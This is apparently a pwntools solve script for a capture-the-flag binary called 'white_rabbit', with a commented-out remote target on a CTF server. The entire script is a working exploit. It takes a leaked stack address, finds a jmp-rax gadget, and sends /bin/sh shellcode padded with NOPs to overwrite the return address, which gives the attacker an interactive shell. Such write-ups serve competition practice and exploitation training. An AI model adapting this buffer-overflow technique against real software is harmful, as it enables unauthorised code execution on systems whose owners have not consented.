 #!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"

p = process('./white_rabbit')
# p = remote('whiterabbit.chal.wwctf.com', 1337)
shellcode = asm(shellcraft.sh())
p.recvuntil(b'> ')
leak = int(p.recvline()[:-1], 16)
jmp_rax = leak - 0xc1
payload = shellcode 
payload = payload.ljust(0x78, b'\x90')
payload += p64(jmp_rax)
p.sendlineafter(b'rabbit...', payload)
p.interactive()
